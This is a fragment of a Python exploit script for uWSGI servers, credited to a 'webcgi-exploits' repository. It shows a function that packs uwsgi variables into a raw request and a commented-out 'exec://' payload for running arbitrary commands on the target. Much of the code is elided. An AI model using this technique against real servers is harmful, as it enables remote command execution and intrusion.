...
# FROM https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
# License: Apache-2.0
# MODIFIED BY INTLSY
...
def ask_uwsgi(addr_and_port, mode, var, body=''):
    # print(var,body)
    msg = pack_uwsgi_vars(var) + body.encode('utf8')
...
def main(*args):
    ...
    # payload = 'exec://' + args.command + ""
    # print("[*]Sending payload.")
    # print(payload)
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, 'localhost:3031/'))
